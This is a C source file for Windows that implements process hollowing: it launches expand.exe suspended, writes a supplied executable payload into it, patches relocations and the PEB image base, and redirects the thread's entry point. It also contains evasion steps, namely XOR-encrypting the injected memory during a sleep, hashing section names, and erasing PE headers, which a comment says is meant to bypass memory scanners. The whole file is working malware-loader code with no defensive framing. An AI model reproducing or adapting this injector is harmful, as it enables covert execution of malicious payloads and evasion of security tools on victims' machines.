#include <Windows.h>
#include <psapi.h>

#include "utils.h"

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}


BOOL Hollow_Me(PPayload_Information _Info) {

	DWORD _FileSize = _Info->Size;
	LPVOID _PtrFileToRun = _Info->Addr;

	WCHAR _SpawnTo[] = L"C:\\Windows\\System32\\expand.exe";

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcess(_SpawnTo, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE _ProcessDestination = pi.hProcess;

#ifdef _DEBUG
	printf("[!]New process is created PID : %d\n\n", pi.dwProcessId);
	getchar();
#endif

	PIMAGE_DOS_HEADER _FileToRunDosHeader = (PIMAGE_DOS_HEADER)_Info->Addr;
	PIMAGE_NT_HEADERS _FileToRunNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)_Info->Addr + _FileToRunDosHeader->e_lfanew);

	//On prend le contenus du context du process crée
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi.hThread, &ctx);

	//On alloue une zone memoire dans le process crée pour ecrire notre fichier � executer
	LPVOID _DestAllocatedAddr = VirtualAllocEx(_ProcessDestination, NULL, _FileToRunNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

#ifdef _DEBUG
	printf("[!]Allocated addr : %p\n[!]ImageBaseAddr in created process : %p\n", _DestAllocatedAddr, _FileToRunNtHeader->OptionalHeader.ImageBase);
#endif

	//On calcul le delta entre le process crée et le contenue du PE en m�moire, il nous servira pour patcher la table de reloc
	SIZE_T _DeltaImgBase = (SIZE_T)_DestAllocatedAddr - _FileToRunNtHeader->OptionalHeader.ImageBase;
#ifdef _DEBUG
	printf("Delta : %d\n", _DeltaImgBase);
#endif


	//On modifie l'adresse de ImageBase par celle de la zone mémoire allouée
	_FileToRunNtHeader->OptionalHeader.ImageBase = (SIZE_T)_DestAllocatedAddr;
	WriteProcessMemory(_ProcessDestination, _DestAllocatedAddr, _Info->Addr, _FileToRunNtHeader->OptionalHeader.SizeOfHeaders, NULL);

	PIMAGE_SECTION_HEADER _RelocSectionHeader = { 0 };

	//On liste les sections du PE en mémoire, puis on les re-ecris dans le process cr�e
	for (WORD i = 0; i < _FileToRunNtHeader->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER _SectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(_FileToRunNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (djb2(_SectionHeader->Name) == 0x271e271e76db80f7) {
			_RelocSectionHeader = _SectionHeader;
		}
		LPVOID _AddrOfSectionInRemoteProcess = (DWORD_PTR)_DestAllocatedAddr + _SectionHeader->VirtualAddress;
		PVOID _PointerOfSectionInFileToRun = (DWORD_PTR)_Info->Addr + _SectionHeader->PointerToRawData;
		SIZE_T _SizeOfHeader = _SectionHeader->SizeOfRawData;

		BOOL _SectionIsWrite = WriteProcessMemory(_ProcessDestination, _AddrOfSectionInRemoteProcess, _PointerOfSectionInFileToRun, _SizeOfHeader, NULL);

#ifdef _DEBUG
		if (_SectionIsWrite)
			printf("Section : %s is rewrited !\n", _SectionHeader->Name);
		else
			printf("Section : %s is not rewrited !\n", _SectionHeader->Name);
		printf("addr : %p\n", _SectionHeader);
#endif
	}

	DWORD _PtrRelocTableRaw = _RelocSectionHeader->PointerToRawData;
	DWORD _RelocOffset = 0;
	IMAGE_DATA_DIRECTORY _RelocationTable = _FileToRunNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];


	//On patch la table de reloc
	while (_RelocOffset < _RelocationTable.Size) {

		PBASE_RELOCATION_BLOCK _RelocBlock = (PBASE_RELOCATION_BLOCK)((SIZE_T)_Info->Addr + _PtrRelocTableRaw + _RelocOffset);
		_RelocOffset += sizeof(BASE_RELOCATION_BLOCK);
		DWORD _RelocEntriesCount = (_RelocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY _RelocationEntries = (PBASE_RELOCATION_ENTRY)((SIZE_T)_Info->Addr + _PtrRelocTableRaw + _RelocOffset);

		for (DWORD y = 0; y < _RelocEntriesCount; y++) {
			_RelocOffset += sizeof(BASE_RELOCATION_ENTRY);
			if (_RelocationEntries[y].Type == 0) {
				continue;
			}
			SIZE_T _PatchedAddr = _RelocBlock->PageAddress + _RelocationEntries[y].Offset;
			SIZE_T _PatchedBuffer = 0;

			ReadProcessMemory(_ProcessDestination, (LPCVOID)((SIZE_T)_DestAllocatedAddr + _PatchedAddr), &_PatchedBuffer, sizeof(SIZE_T), NULL);

#ifdef _DEBUG
			SIZE_T _OldAddr = _PatchedBuffer;
#endif
			_PatchedBuffer += (SIZE_T)_DeltaImgBase;
#ifdef _DEBUG
			printf("Old addr : %p | New addr : %p | %d (old addr) + %d (delta) = %d (new addr)\n", _OldAddr, _PatchedAddr, _OldAddr, _DeltaImgBase, _PatchedBuffer);
#endif

			BOOL _PatchIsOk = WriteProcessMemory(_ProcessDestination, (LPCVOID)((SIZE_T)_DestAllocatedAddr + _PatchedAddr), &_PatchedBuffer, sizeof(SIZE_T), NULL);
#ifdef _DEBUG
			if (!_PatchIsOk)
				printf("Addr is not rewrited !\n");
#endif
		}
	}


	//On modifie RCX par l'addresse de la nouvelle ImageBase
	ctx.Rcx = (SIZE_T)((LPBYTE)_DestAllocatedAddr + _FileToRunNtHeader->OptionalHeader.AddressOfEntryPoint);

	//On modifie le ImageBase de PEB
	WriteProcessMemory(_ProcessDestination, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &_DestAllocatedAddr, sizeof(_DestAllocatedAddr), NULL);

#ifdef _DEBUG
	printf("Après modification de PEB\n");
	printf("Allocated addr : %p\n", (DWORD_PTR)&_DestAllocatedAddr);
	getchar();
#endif


	//On met le contexte du thread avec la structure modifié qui contient la nouvelle ImageBaseAddress
	SetThreadContext(pi.hThread, &ctx);

	LPVOID _MemContent = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)_FileSize);
	char Memkey[] = "DorEtDePlatine";

	ReadProcessMemory(_ProcessDestination, _DestAllocatedAddr, _MemContent, _FileSize, NULL);
	XOR((char*)_MemContent, _FileSize, Memkey, sizeof(Memkey));//Encrypt data in memory

	WriteProcessMemory(_ProcessDestination, _DestAllocatedAddr, _MemContent, _FileSize, NULL);

	Sleep(15 * 1000);

	XOR((char*)_MemContent, _FileSize, Memkey, sizeof(Memkey));//Decrypt data in memory
	WriteProcessMemory(_ProcessDestination, _DestAllocatedAddr, _MemContent, _FileSize, NULL);

	ResumeThread(pi.hThread);
	Sleep(1000);

	//On vire les headers pour bypass des scanneur de mémoire
	SIZE_T _SizeOfHeader = _FileToRunNtHeader->OptionalHeader.SizeOfHeaders;
	PBYTE _PtrToEraseHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, _SizeOfHeader);
	for (SIZE_T i = 0; i < _SizeOfHeader; i++) {
		_PtrToEraseHeader[i] = '\x00';
	}
	WriteProcessMemory(_ProcessDestination, _DestAllocatedAddr, _PtrToEraseHeader, _SizeOfHeader, NULL);



}

